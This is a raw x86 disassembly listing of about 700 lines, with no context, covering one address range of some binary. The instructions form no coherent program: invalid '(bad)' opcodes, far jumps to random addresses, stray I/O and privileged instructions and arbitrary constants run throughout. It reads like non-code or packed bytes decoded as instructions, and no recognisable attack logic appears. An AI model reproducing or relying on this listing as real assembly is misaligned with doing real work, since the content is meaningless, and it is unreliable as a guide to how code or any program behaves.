  417cef:	fcomp  st(2)
  417cf1:	ins    DWORD PTR es:[edi],dx
  417cf2:	cmc    
  417cf3:	ins    DWORD PTR es:[edi],dx
  417cf4:	pushf  
  417cf5:	(bad)  
  417cf6:	mov    eax,0x8d2cb4cc
  417cfb:	dec    ebp
  417cfc:	cmp    cl,dl
  417cfe:	mov    ds,WORD PTR [ebx]
  417d00:	loope  0x417d2c
  417d02:	mov    al,ds:0xe6f9427d
  417d07:	adc    ch,BYTE PTR [ecx+0xb]
  417d0a:	or     al,0xb1
  417d0c:	(bad)  
  417d0d:	mov    es,WORD PTR [edi]
  417d0f:	ins    DWORD PTR es:[edi],dx
  417d10:	retf   
  417d11:	and    DWORD PTR [esi-0x12737cea],edi
  417d17:	and    eax,0x352e8ec1
  417d1c:	jl     0x417cc8
  417d1e:	mov    edx,0x996bc297
  417d23:	cmp    ebx,DWORD PTR [ecx+0x4a]
  417d26:	test   al,0x52
  417d28:	fcmovnb st,st(1)
  417d2a:	inc    esp
  417d2b:	loope  0x417d11
  417d2d:	fdiv   st(1),st
  417d2f:	mov    bl,0x7a
  417d31:	lahf   
  417d32:	loopne 0x417d63
  417d34:	mov    esi,0x18dfa30
  417d39:	bound  eax,QWORD PTR [ebp+0x728ce24b]
  417d3f:	jge    0x417d71
  417d41:	(bad)  
  417d42:	push   ebx
  417d43:	daa    
  417d44:	(bad)  
  417d45:	mov    edi,0xb4448883
  417d4a:	adc    al,0x4b
  417d4c:	xchg   BYTE PTR [eax-0x69948965],bl
  417d52:	sbb    ecx,ebx
  417d54:	aad    0x4d
  417d56:	fucomi st,st(5)
  417d58:	xchg   ebp,eax
  417d59:	fcomip st,st(2)
  417d5b:	xchg   DWORD PTR [edx],ebx
  417d5d:	pop    esi
  417d5e:	jae    0x417d51
  417d60:	(bad)  
  417d61:	int3   
  417d62:	jae    0x417d6b
  417d64:	arpl   WORD PTR [edi],bp
  417d66:	or     DWORD PTR [eax+edx*2],esi
  417d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d6a:	sbb    bl,ch
  417d6c:	enter  0xddbd,0x97
  417d70:	xor    al,0xeb
  417d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d73:	or     esp,DWORD PTR [ebx-0x1bb06781]
  417d79:	out    dx,eax
  417d7a:	mov    eax,0x2f1923e3
  417d7f:	push   ebx
  417d80:	(bad)  
  417d81:	pop    edx
  417d82:	ficom  WORD PTR [ebx+0x69]
  417d85:	sub    BYTE PTR [edx-0x80],dh
  417d88:	(bad)  
  417d89:	rol    DWORD PTR [edx-0x33],cl
  417d8c:	sahf   
  417d8d:	dec    ecx
  417d8e:	push   edi
  417d8f:	mov    dl,0x22
  417d91:	jnp    0x417d13
  417d93:	loope  0x417d71
  417d95:	pop    ss
  417d96:	xlat   BYTE PTR ds:[ebx]
  417d97:	add    eax,0xffd92e7e
  417d9c:	clc    
  417d9d:	jmp    0x9a57:0x3e62ca3c
  417da4:	ins    BYTE PTR es:[edi],dx
  417da5:	dec    edx
  417da6:	cmp    eax,0x3ce1dd77
  417dab:	xor    DWORD PTR [ebx+eax*1+0x25],edi
  417daf:	mov    ecx,0x576c3c5
  417db4:	mov    eax,0xa3a0b84c
  417db9:	icebp  
  417dba:	sbb    esi,eax
  417dbc:	mov    eax,0xd2ec0685
  417dc1:	jnp    0x417d62
  417dc3:	outs   dx,BYTE PTR ds:[esi]
  417dc4:	rol    bl,1
  417dc6:	test   eax,0x885349e3
  417dcb:	mov    edi,0xd01f7a12
  417dd0:	mov    ds:0xcaf848f5,al
  417dd5:	push   ebp
  417dd6:	cli    
  417dd7:	pop    ebp
  417dd8:	and    eax,0x56fa6cc3
  417ddd:	xor    eax,0x67bebb83
  417de2:	dec    eax
  417de3:	or     ebx,DWORD PTR [edi+0x6a]
  417de6:	mov    WORD PTR [eax+0x61],es
  417de9:	mov    ah,0x58
  417deb:	(bad)  
  417dec:	push   0x3d3edfa3
  417df1:	sub    DWORD PTR [edx+0x7648db93],esi
  417df7:	jnp    0x417e66
  417df9:	fist   WORD PTR [edx+0x85bec13]
  417dff:	dec    eax
  417e00:	inc    edx
  417e01:	xchg   esi,eax
  417e02:	je     0x417e2b
  417e04:	dec    edx
  417e05:	test   BYTE PTR [esi-0x4a],dh
  417e08:	pop    ds
  417e09:	pop    edi
  417e0a:	pop    ds
  417e0b:	adc    DWORD PTR cs:[eax+0x1c],esi
  417e0f:	fwait
  417e10:	les    eax,FWORD PTR [ebx]
  417e12:	fimul  WORD PTR [edi-0x7e]
  417e15:	inc    esi
  417e16:	add    al,0x4f
  417e18:	ds in  eax,dx
  417e1a:	inc    edi
  417e1b:	xor    al,0x34
  417e1d:	(bad)  
  417e1f:	mov    dh,0x1d
  417e21:	jp     0x417e8f
  417e23:	mov    edi,0xa5323348
  417e28:	jle    0x417dc7
  417e2a:	mov    ch,0x22
  417e2c:	xchg   ebp,eax
  417e2d:	retf   0x83ae
  417e30:	in     eax,dx
  417e31:	add    DWORD PTR [edx-0x6f7bfe4b],edx
  417e37:	jmp    0xd40e:0xa7b58022
  417e3e:	and    ebp,DWORD PTR [ebx]
  417e40:	repz aas 
  417e42:	xor    esp,DWORD PTR [ebx]
  417e44:	mov    bl,0x6c
  417e46:	mov    WORD PTR [edx+0x5d957151],ds
  417e4c:	push   esp
  417e4d:	pop    edx
  417e4e:	sub    eax,0x85468e44
  417e53:	jno    0x417e2f
  417e55:	ss in  eax,0x8e
  417e58:	push   0xeb609ab9
  417e5d:	lea    edi,[edx]
  417e5f:	loope  0x417e68
  417e61:	test   eax,0xc7250300
  417e66:	inc    edi
  417e67:	in     eax,0x59
  417e69:	and    al,0xa4
  417e6b:	fistp  WORD PTR [ecx+0x6f]
  417e6e:	fistp  QWORD PTR [edx+0x758467ed]
  417e74:	jo     0x417ec0
  417e76:	cmp    ecx,esi
  417e78:	fsub   DWORD PTR [edx+0x35a4b7e5]
  417e7e:	xchg   DWORD PTR [edx],ecx
  417e80:	pusha  
  417e81:	out    0x92,eax
  417e83:	sub    BYTE PTR [ecx-0x5ca826bb],al
  417e89:	cmp    ch,BYTE PTR [ecx]
  417e8b:	xor    eax,DWORD PTR [eax+0x4d]
  417e8e:	(bad)  
  417e8f:	xchg   ebx,eax
  417e90:	and    DWORD PTR [ebx+ebx*8],0xffffffaa
  417e94:	mov    ds:0x6db9b1f5,eax
  417e99:	jp     0x417ead
  417e9b:	jmp    0x5c53:0xa73794ef
  417ea2:	ss in  eax,0xae
  417ea5:	fdivr  DWORD PTR [ebx+0x3a]
  417ea8:	push   0x1331377f
  417ead:	outs   dx,DWORD PTR ds:[esi]
  417eae:	gs xor al,0xff
  417eb1:	lds    edx,FWORD PTR [edi-0x6c]
  417eb4:	add    al,0x3f
  417eb6:	mov    dl,0x21
  417eb8:	mov    cl,0x13
  417eba:	je     0x417e49
  417ebc:	(bad)  
  417ebd:	jnp    0x417e7c
  417ebf:	mov    BYTE PTR [esi+0x4d],bl
  417ec2:	aaa    
  417ec3:	fistp  WORD PTR [esi-0x69157b46]
  417ec9:	mov    al,0xaa
  417ecb:	mov    ecx,0xc2c46187
  417ed0:	inc    edi
  417ed1:	xchg   ebx,eax
  417ed2:	dec    ebx
  417ed3:	inc    edi
  417ed4:	lods   eax,DWORD PTR ds:[esi]
  417ed5:	mov    DWORD PTR [edx+0x3460d263],esi
  417edb:	shl    BYTE PTR [eax+ebp*8],cl
  417ede:	mov    eax,ds:0x4764e21c
  417ee3:	fcmovu st,st(3)
  417ee5:	mov    edx,0xfd7a1db0
  417eea:	xor    BYTE PTR [ebx-0x64],al
  417eed:	or     edi,edx
  417eef:	scas   al,BYTE PTR es:[edi]
  417ef0:	adc    eax,0xb4558e93
  417ef5:	adc    BYTE PTR [ebx-0x4707cce7],cl
  417efb:	or     dl,BYTE PTR [ebx+0x148b97ba]
  417f01:	xchg   esi,eax
  417f02:	jns    0x417ed9
  417f04:	mov    bl,0x0
  417f06:	cs cs jecxz 0x417eba
  417f0a:	sbb    DWORD PTR [ebx+0x69],ebx
  417f0d:	mov    bh,0x55
  417f0f:	int3   
  417f10:	adc    dh,BYTE PTR [edi]
  417f12:	test   eax,0x4200cd56
  417f17:	dec    edi
  417f18:	pop    es
  417f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f1a:	stc    
  417f1b:	xor    eax,esi
  417f1d:	hlt    
  417f1e:	leave  
  417f1f:	push   edx
  417f20:	xor    DWORD PTR [ecx+0x53dfd652],edi
  417f26:	jge    0x417f0e
  417f28:	pushf  
  417f29:	and    BYTE PTR [edi+0x480043c],0xf1
  417f30:	push   esi
  417f31:	sti    
  417f32:	rol    BYTE PTR [eax+0x54d3b41f],cl
  417f38:	jae    0x417f07
  417f3a:	lds    ecx,FWORD PTR [edx+eax*4]
  417f3d:	xchg   esi,eax
  417f3e:	das    
  417f3f:	and    al,0x36
  417f41:	pop    edi
  417f42:	push   esp
  417f43:	(bad)  
  417f44:	or     esi,esp
  417f46:	xchg   BYTE PTR [ebx-0x3a],dl
  417f49:	jle    0x417f9e
  417f4b:	enter  0x456c,0x47
  417f4f:	xor    DWORD PTR [edi],edx
  417f51:	ss std 
  417f53:	lods   al,BYTE PTR ds:[esi]
  417f54:	xchg   esi,eax
  417f55:	arpl   WORD PTR [edi+0x49],sp
  417f58:	cmp    DWORD PTR [edx-0x92d459b],edx
  417f5e:	xchg   edi,eax
  417f5f:	and    ebp,DWORD PTR [esi]
  417f61:	adc    ebx,0x86fa1142
  417f67:	xchg   esi,eax
  417f68:	femms  
  417f6a:	icebp  
  417f6b:	ror    DWORD PTR [eax],1
  417f6d:	jmp    0x6a76f3cf
  417f72:	repnz mov dl,ch
  417f75:	pop    esi
  417f76:	pop    edx
  417f77:	push   0x927e9fcd
  417f7c:	xchg   BYTE PTR [ecx],ch
  417f7e:	jmp    0x679d57e2
  417f83:	sub    al,BYTE PTR [eax]
  417f85:	inc    ebx
  417f86:	(bad)  
  417f88:	xchg   ecx,eax
  417f89:	mov    esi,0x5b934674
  417f8e:	mov    dh,0x5e
  417f90:	fimul  WORD PTR [ebx+0x13]
  417f93:	nop
  417f94:	mov    cs,edi
  417f96:	fbld   TBYTE PTR [edi-0x37]
  417f99:	adc    ch,BYTE PTR [esi-0x369582fb]
  417f9f:	jle    0x417f59
  417fa1:	dec    ecx
  417fa2:	mov    dh,0x65
  417fa4:	pop    ds
  417fa5:	push   ebx
  417fa6:	xor    bh,ch
  417fa8:	and    al,0xb9
  417faa:	je     0x418020
  417fac:	mov    esi,0xcff178b8
  417fb1:	inc    ecx
  417fb2:	ror    bl,0xf
  417fb5:	pop    edi
  417fb6:	push   ds
  417fb7:	add    eax,0xa3afe240
  417fbc:	rcr    DWORD PTR [ebp-0x2c08461d],cl
  417fc2:	stc    
  417fc3:	aam    0x6d
  417fc5:	js     0x417fdf
  417fc7:	test   eax,0x807d0f6d
  417fcc:	jg     0x417f88
  417fce:	or     cl,dh
  417fd0:	inc    ebx
  417fd1:	xchg   esp,eax
  417fd2:	sbb    DWORD PTR [ebx+0x13],ecx
  417fd5:	xor    esi,0xffffffbb
  417fd8:	push   ebx
  417fd9:	idiv   esp
  417fdb:	xchg   ebp,eax
  417fdc:	arpl   WORD PTR [ebp-0x3a9f3fa7],bp
  417fe2:	cld    
  417fe3:	xor    ecx,DWORD PTR [ecx]
  417fe5:	pushf  
  417fe6:	push   ds
  417fe7:	out    0xe0,al
  417fe9:	cmp    eax,0x401391da
  417fee:	jl     0x41802a
  417ff0:	xor    eax,0x88be9865
  417ff5:	hlt    
  417ff6:	inc    edx
  417ff7:	sub    dh,bl
  417ff9:	je     0x418002
  417ffb:	int    0xbf
  417ffd:	sbb    BYTE PTR [ebx+0x5f],ah
  418000:	(bad)  
  418002:	dec    esi
  418003:	mov    esp,0xcb052064
  418008:	sbb    ch,BYTE PTR [edi]
  41800a:	lock outs dx,DWORD PTR ds:[esi]
  41800c:	lods   al,BYTE PTR ds:[esi]
  41800d:	fs xor eax,0x9fabe751
  418013:	out    dx,eax
  418014:	mov    eax,ebp
  418016:	xor    DWORD PTR ds:0x11554f92,edx
  41801c:	add    dh,BYTE PTR [ebx-0x2ae9617]
  418022:	div    BYTE PTR [esi-0x33]
  418025:	mov    dl,0x37
  418027:	and    eax,0x10d42eba
  41802c:	jmp    0x31351d97
  418031:	jge    0x418005
  418033:	jo     0x417fc7
  418035:	dec    esp
  418036:	(bad)  
  418037:	jg     0x417fe3
  418039:	into   
  41803a:	or     BYTE PTR [edx],ch
  41803c:	mov    ch,0x81
  41803e:	cmp    ebx,esp
  418040:	jnp    0x417fef
  418042:	adc    DWORD PTR [eax+ecx*2],edx
  418045:	aaa    
  418046:	ret    
  418047:	push   ss
  418048:	sar    dl,1
  41804a:	test   eax,0x97156cf1
  41804f:	ja     0x418054
  418051:	jge    0x418070
  418053:	loopne 0x417fd6
  418055:	pop    eax
  418056:	inc    eax
  418057:	jno    0x418061
  418059:	imul   esp,DWORD PTR [ebp+0xa],0x6510ad00
  418060:	mov    al,0x93
  418062:	scas   al,BYTE PTR es:[edi]
  418063:	mov    ecx,0xa7c585d2
  418068:	loopne 0x418050
  41806a:	pushf  
  41806b:	lahf   
  41806c:	sbb    edi,DWORD PTR [edx-0x196f2258]
  418072:	mov    dh,0x6b
  418074:	ss push 0x39921a00
  41807a:	jns    0x418086
  41807c:	pop    ebx
  41807d:	retf   
  41807e:	hlt    
  41807f:	cmp    al,0xee
  418081:	push   cs
  418082:	pop    es
  418083:	cdq    
  418084:	mov    ecx,0xac99a390
  418089:	retf   
  41808a:	dec    esp
  41808b:	dec    eax
  41808c:	retf   0xf4f4
  41808f:	xchg   esp,eax
  418090:	(bad)  
  418091:	adc    DWORD PTR [eax],0x4ee6649a
  418097:	(bad)  
  418098:	inc    ebp
  418099:	adc    ebx,DWORD PTR [ebx-0xd4d4225]
  41809f:	adc    DWORD PTR [eax],edi
  4180a1:	imul   ebx
  4180a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180a4:	add    DWORD PTR [ebp+0x61755508],ecx
  4180aa:	adc    BYTE PTR [edx-0x1f],ah
  4180ad:	pop    ecx
  4180ae:	pop    esi
  4180af:	jge    0x4180a6
  4180b1:	loopne 0x4180eb
  4180b3:	inc    ecx
  4180b4:	sbb    BYTE PTR [edi-0x75b83d4e],ah
  4180ba:	into   
  4180bb:	mov    esi,0x99daeca1
  4180c0:	loop   0x418138
  4180c2:	and    eax,0x56750c86
  4180c7:	mov    cl,bl
  4180c9:	int3   
  4180ca:	fidivr WORD PTR [esi-0x34dab7a6]
  4180d0:	sub    dh,BYTE PTR [edi]
  4180d2:	call   0x3119:0x7c1cfa9a
  4180d9:	aad    0xfa
  4180db:	rol    ebx,cl
  4180dd:	xchg   BYTE PTR [edx-0x5c2aa525],al
  4180e3:	mov    ecx,0x5d96bc57
  4180e8:	sub    BYTE PTR [ebx+edx*1],bl
  4180eb:	sbb    esi,DWORD PTR ds:0x51a2b2fe
  4180f1:	jl     0x41813e
  4180f3:	(bad)
  4180f7:	jmp    0x2415032a
  4180fc:	adc    esp,DWORD PTR [edx+esi*4+0x71]
  418100:	mov    al,ds:0xeb4b2485
  418105:	fwait
  418106:	inc    ebp
  418107:	and    ebp,DWORD PTR [ebx-0x18]
  41810a:	fmul   QWORD PTR [eax+0x3cac7cbb]
  418110:	mov    ebp,0x19184347
  418115:	mov    ebx,0xae026923
  41811a:	and    ebp,DWORD PTR [ebx+0x714fb3d8]
  418120:	cmp    al,0x9b
  418122:	fmul   QWORD PTR [ecx+0x6d90c02b]
  418128:	mov    cl,0x10
  41812a:	push   ecx
  41812b:	nop
  41812c:	fsub   DWORD PTR [edx]
  41812e:	and    DWORD PTR [edx],ebp
  418130:	xor    BYTE PTR [ecx-0x6b],dl
  418133:	inc    ecx
  418134:	add    DWORD PTR [eax],0x299b3097
  41813a:	imul   BYTE PTR [ecx]
  41813c:	push   ebx
  41813d:	popf   
  41813e:	jp     0x418182
  418140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418141:	inc    eax
  418142:	je     0x4181a9
  418144:	push   ds
  418145:	icebp  
  418146:	dec    edi
  418147:	daa    
  418148:	sti    
  418149:	push   ebx
  41814a:	pusha  
  41814b:	mov    ds:0xe115e309,eax
  418150:	cmp    DWORD PTR [esi+esi*4-0x2e],eax
  418154:	jmp    DWORD PTR [esp+ecx*8+0x75e432b4]
  41815b:	push   es
  41815c:	dec    eax
  41815d:	pop    ecx
  41815e:	scas   eax,DWORD PTR es:[edi]
  41815f:	jo     0x41819e
  418161:	cmp    al,0xd3
  418163:	fistp  QWORD PTR [edi-0x28]
  418166:	mov    al,0xee
  418168:	jae    0x4180f1
  41816a:	retf   
  41816b:	push   di
  41816d:	sti    
  41816e:	cmp    edi,DWORD PTR cs:[edx-0x42]
  418172:	inc    ebp
  418173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418174:	push   edx
  418175:	clc    
  418176:	sbb    BYTE PTR [eax],al
  418178:	fistp  WORD PTR [ebx+edx*1]
  41817b:	inc    eax
  41817c:	xor    al,0x39
  41817e:	cmp    al,0x56
  418180:	pop    eax
  418181:	cmp    BYTE PTR [esi],dh
  418183:	dec    edx
  418184:	loop   0x4181b3
  418186:	mov    cl,0xef
  418188:	pop    ebp
  418189:	sbb    ebx,esp
  41818b:	push   ds
  41818c:	enter  0xf86f,0xc7
  418190:	adc    edx,DWORD PTR [esi]
  418192:	mov    ebp,edx
  418194:	addr16 aad 0x77
  418197:	ins    BYTE PTR es:[edi],dx
  418198:	pop    eax
  418199:	xchg   ecx,eax
  41819a:	push   esp
  41819b:	imul   esi,DWORD PTR [esi-0x50],0x9b9fa01e
  4181a2:	xchg   edx,eax
  4181a3:	loop   0x4181b6
  4181a5:	data16 mov BYTE PTR [ebp+0x1f],bl
  4181a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181aa:	(bad)
  4181ae:	xor    eax,0x42cc8369
  4181b3:	xor    al,0x93
  4181b5:	push   ecx
  4181b6:	std    
  4181b7:	xchg   ebp,eax
  4181b8:	inc    ecx
  4181b9:	(bad)  
  4181ba:	loopne 0x418147
  4181bc:	adc    esi,DWORD PTR ss:[ecx-0x3f90b2f1]
  4181c3:	cld    
  4181c4:	shl    bh,1
  4181c6:	inc    edi
  4181c7:	cmp    al,al
  4181c9:	mov    ebx,ecx
  4181cb:	pop    ebp
  4181cc:	iret   
  4181cd:	mov    ds,ebx
  4181cf:	out    dx,eax
  4181d0:	adc    BYTE PTR [edx],0x4f
  4181d3:	sbb    DWORD PTR ds:0xa98d8ef3,ebp
  4181d9:	(bad)  
  4181da:	loop   0x418191
  4181dc:	fbstp  TBYTE PTR [edx]
  4181de:	lods   eax,DWORD PTR ds:[esi]
  4181df:	ror    edi,cl
  4181e1:	cmp    ebx,DWORD PTR [edx]
  4181e3:	jne    0x4181aa
  4181e5:	mov    ds:0x4461a4af,al
  4181ea:	ss inc ebp
  4181ec:	adc    eax,edi
  4181ee:	add    edi,edi
  4181f0:	pop    ecx
  4181f1:	outs   dx,BYTE PTR ds:[esi]
  4181f2:	aas    
  4181f3:	arpl   WORD PTR [ebx],cx
  4181f5:	jno    0x41817e
  4181f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181f8:	pop    eax
  4181f9:	or     al,0x19
  4181fb:	repz xchg edi,eax
  4181fd:	stc    
  4181fe:	mov    edx,0xcd7f3b3e
  418203:	jecxz  0x4181a6
  418205:	js     0x418229
  418207:	int    0xce
  418209:	call   0x97c3d6e1
  41820e:	xchg   ebx,eax
  41820f:	lods   eax,DWORD PTR ds:[esi]
  418210:	jae    0x41821e
  418212:	mov    al,0x68
  418214:	mov    edx,0x144e2870
  418219:	dec    esp
  41821a:	cmp    al,0xa5
  41821c:	scas   al,BYTE PTR es:[edi]
  41821d:	push   edi
  41821e:	xchg   esi,eax
  41821f:	jmp    0x7c0e:0xbb955764
  418226:	adc    al,0x10
  418228:	das    
  418229:	out    dx,eax
  41822a:	mov    dh,0xb7
  41822c:	cdq    
  41822d:	adc    al,0xa4
  41822f:	sbb    ebx,DWORD PTR ds:0xe8549d8
  418235:	pop    esp
  418236:	pop    ebp
  418237:	and    ecx,DWORD PTR [ebx]
  418239:	sar    DWORD PTR [edi],1
  41823b:	sbb    DWORD PTR [esi-0x49],esi
  41823e:	cmp    eax,0x1809c9e7
  418243:	mov    cl,0x26
  418245:	push   eax
  418246:	push   edi
  418247:	repnz dec ebx
  418249:	pop    ds
  41824a:	sbb    eax,0x4c5f2f13
  41824f:	cs cmp al,0xb9
  418252:	xchg   edx,eax
  418253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418254:	sti    
  418255:	or     BYTE PTR [ecx],0x18
  418258:	sub    al,0xb6
  41825a:	mov    eax,ds:0x961e4c07
  41825f:	and    eax,DWORD PTR [edx+edx*1]
  418262:	mov    ebp,esp
  418264:	mov    dh,0x82
  418266:	stc    
  418267:	dec    eax
  418268:	mov    eax,0xdc83d82e
  41826d:	xor    eax,0x7062fbc9
  418272:	(bad)  
  418273:	out    0x33,al
  418275:	jle    0x41825d
  418277:	stos   BYTE PTR es:[edi],al
  418278:	jae    0x4182d9
  41827a:	pushf  
  41827b:	lods   al,BYTE PTR ds:[esi]
  41827c:	stos   BYTE PTR es:[edi],al
  41827d:	adc    al,0x39
  41827f:	ret    
  418280:	fnstenv [ebx-0x9d60b73]
  418286:	arpl   WORD PTR [ebp-0x2b],bp
  418289:	into   
  41828a:	jo     0x41824a
  41828c:	adc    al,0xbb
  41828e:	pushf  
  41828f:	aaa    
  418290:	cdq    
  418291:	std    
  418292:	dec    edi
  418293:	xor    bh,BYTE PTR [edi+0x61]
  418296:	ret    
  418297:	cmc    
  418298:	and    eax,0x42c78d8c
  41829d:	sbb    eax,0xc1bcc36d
  4182a2:	mov    ah,0x47
  4182a4:	in     eax,dx
  4182a5:	or     edi,DWORD PTR [edx]
  4182a7:	pop    esp
  4182a8:	(bad)  
  4182a9:	cmp    al,0xaa
  4182ab:	xor    eax,0x7f865063
  4182b0:	dec    edi
  4182b1:	clc    
  4182b2:	lds    ecx,FWORD PTR [ebp-0x4b]
  4182b5:	lock ret 
  4182b7:	push   edx
  4182b8:	enter  0x2872,0x63
  4182bc:	pop    ebp
  4182bd:	rcr    BYTE PTR [ecx+0x71a8e2fb],0xa4
  4182c4:	in     eax,0x14
  4182c6:	aas    
  4182c7:	shl    BYTE PTR [esi+0x5b],cl
  4182ca:	leave  
  4182cb:	xor    ecx,DWORD PTR ds:[ebx]
  4182ce:	mov    ecx,0xac0c5528
  4182d3:	or     DWORD PTR [ecx-0x93585ef],esp
  4182d9:	ficom  DWORD PTR [ebp+0x414d0315]
  4182df:	cld    
  4182e0:	sbb    edi,0x35
  4182e3:	pop    esi
  4182e4:	cmp    edx,ecx
  4182e6:	add    BYTE PTR [edi+0xa7377df],ch
  4182ec:	jb     0x4182f9
  4182ee:	mov    edi,0xc1ad43ca
  4182f3:	xor    BYTE PTR [edi],bl
  4182f5:	sub    DWORD PTR [edx],ebx
  4182f7:	add    eax,0x4fb37dcb
  4182fc:	jmp    0x418306
  4182fe:	mov    dl,0xa1
  418300:	call   0x155c:0xe8600901
  418307:	and    eax,0xa9203fd5
  41830c:	inc    ebp
  41830d:	aas    
  41830e:	push   cs
  41830f:	xor    al,0x6a
  418311:	inc    ebp
  418312:	mov    BYTE PTR [ebp-0x448d4308],dh
  418318:	test   eax,0xc6b63602
  41831d:	xchg   ecx,eax
  41831e:	bound  edi,QWORD PTR [esi-0x140de0b7]
  418324:	add    eax,0xc3dda79f
  418329:	mov    dh,0xac
  41832b:	and    BYTE PTR [bp+di-0x3f],0xb0
  418330:	mov    eax,ds:0x79500c90
  418335:	xchg   ebx,eax
  418336:	inc    ebx
  418337:	or     al,0x44
  418339:	pop    ebp
  41833a:	inc    eax
  41833b:	xor    edi,DWORD PTR [eax+0x23fd03ec]
  418341:	retf   0x3b57
  418344:	push   esp
  418345:	jmp    0xb3fe1c6a
  41834a:	xchg   edi,eax
  41834b:	dec    edx
  41834c:	mov    cl,0x84
  41834e:	and    DWORD PTR [eax],0xb8a21f76
  418354:	mov    al,ds:0x7508ca15
  418359:	jb     0x41837b
  41835b:	dec    eax
  41835c:	aas    
  41835d:	jnp    0x4183d7
  41835f:	push   edi
  418360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418361:	fnstenv [ebp+0x3100a018]
  418367:	sahf   
  418368:	ror    DWORD PTR [ecx+0x1d],1
  41836b:	push   esi
  41836c:	add    eax,0x7af98f9e
  418371:	dec    ebx
  418372:	imul   esp,DWORD PTR [esi+0x30],0x159ce29
  418379:	rol    BYTE PTR [esi+0x4a164688],1
  41837f:	cmp    cl,BYTE PTR [edx]
  418381:	les    esi,FWORD PTR [edx]
  418383:	pop    ss
  418384:	out    dx,eax
  418385:	or     BYTE PTR [ebp-0x2d],bl
  418388:	ins    DWORD PTR es:[edi],dx
  418389:	and    BYTE PTR [edi+0x11],bl
  41838c:	scas   eax,DWORD PTR es:[edi]
  41838d:	(bad)  
  41838e:	mov    ah,0x78
  418390:	cmp    bl,BYTE PTR [ebp+ebp*8-0x45]
  418394:	leave  
  418395:	cmc    
  418396:	push   ebp
  418397:	lahf   
  418398:	int    0x83
  41839a:	push   esi
  41839b:	test   al,0x4e
  41839d:	lea    ecx,[edx+eax*8]
  4183a0:	add    ecx,eax
  4183a2:	outs   dx,DWORD PTR ds:[esi]
  4183a3:	lods   al,BYTE PTR ds:[esi]
  4183a4:	mov    eax,ds:0x8a7a57fa
  4183a9:	sahf   
  4183aa:	mov    ecx,0x5bfee13d
  4183af:	fwait
  4183b0:	mov    dh,0x4d
  4183b2:	ficomp WORD PTR [esi-0x3d]
  4183b5:	add    cl,BYTE PTR [ecx-0x3b]
  4183b8:	push   ss
  4183b9:	jmp    0x601f:0xb1794118
  4183c0:	dec    edi
  4183c1:	xchg   esp,eax
  4183c2:	paddusb mm0,QWORD PTR [esi-0x7b]
  4183c6:	xor    BYTE PTR [esi],ah
  4183c8:	mov    ah,BYTE PTR [ebp+0x2e]
  4183cb:	stc    
  4183cc:	stos   DWORD PTR es:[edi],eax
  4183cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ce:	and    dl,BYTE PTR [ebx-0x344ad0e5]
  4183d4:	(bad)  
  4183d5:	mov    edx,0x207b635c
  4183da:	addr16 test al,0x17
  4183dd:	xor    eax,0xb80df01
  4183e2:	push   ss
  4183e3:	jno    0x41844f
  4183e5:	fdivr  DWORD PTR [ebp-0x2e37a5bf]
  4183eb:	xor    ch,BYTE PTR ds:0xc8a7b301
  4183f1:	mov    al,ds:0xf9b25e3c
  4183f6:	push   0x64d181b8
  4183fb:	inc    esp
  4183fc:	mov    eax,ds:0x6bb2ef2b
  418401:	out    0xf1,eax
  418403:	fdiv   DWORD PTR [ecx]
  418405:	aam    0xdb
  418407:	add    al,0x8b
  418409:	gs scas al,BYTE PTR es:[edi]
  41840b:	add    eax,0x49579016
  418410:	aaa    
  418411:	fsubr  DWORD PTR [ebx-0x60]
  418414:	adc    dl,ch
  418416:	fcomi  st,st(6)
  418418:	std    
  418419:	sub    al,0x44
  41841b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41841c:	jle    0x418492
  41841e:	and    dh,BYTE PTR [edi+ebx*8+0x7d]
  418422:	(bad)  
  418423:	out    dx,al
  418424:	push   ebx
  418425:	shl    DWORD PTR [edx+0x72],0x2a
  418429:	sahf   
  41842a:	adc    bl,dl
  41842c:	pushf  
  41842d:	sbb    eax,0x9a00b2a7
  418432:	or     eax,0x9e9460e9
  418437:	jecxz  0x4183d7
  418439:	jnp    0x4183ef
  41843b:	int3   
  41843c:	shr    DWORD PTR [esp+eax*1],cl
  41843f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418440:	retf   
  418441:	out    0xe0,eax
  418443:	sub    BYTE PTR [esi-0x77],0x1b
  418447:	out    dx,al
  418448:	xor    DWORD PTR [eax-0x20],ebp
  41844b:	inc    edi
  41844c:	or     eax,0xc1c06bec
  418451:	xor    DWORD PTR [ebx+0x31],edi
  418454:	push   esp
  418455:	jo     0x418403
  418457:	rcl    BYTE PTR [edx+0x4d1d0607],cl
  41845d:	loop   0x418493
  41845f:	xor    bl,bh
  418461:	xchg   esp,eax
  418462:	mov    dl,0x36
  418464:	mov    bl,0x36
  418466:	addr16 xchg ebp,eax
  418468:	push   ebx
  418469:	sub    DWORD PTR [edx+0x5b],edx
  41846c:	jg     0x41840b
  41846e:	xor    ch,BYTE PTR [eax+0x3606ede1]
  418474:	dec    esi
  418475:	test   eax,0x8a544c9d
  41847a:	xor    cl,al
  41847c:	dec    ebx
  41847d:	dec    ebx
  41847e:	and    al,0x1c
  418480:	xchg   esp,eax
  418481:	sbb    eax,0x540ef61a
  418486:	mov    WORD PTR [eax],?
  418488:	mov    edi,0xacbac628
  41848d:	mov    ch,0xeb
  41848f:	push   edi
  418490:	or     dh,ah
  418492:	arpl   WORD PTR gs:[ebp+0x3ff08229],bp
  418499:	jbe    0x4184da
  41849b:	rcl    DWORD PTR [ebp-0x80],0x47
  41849f:	cmp    edx,ebx
  4184a1:	daa    
  4184a2:	(bad)  
  4184a3:	jmp    DWORD PTR [ebx+0x27]
  4184a6:	daa    
  4184a7:	(bad)  
  4184ab:	std    
  4184ac:	rol    ebx,0x0
  4184af:	(bad)  
  4184b0:	xor    DWORD PTR [ebp+0x4f89a1a0],esi
  4184b6:	mov    edi,0xf16e5421
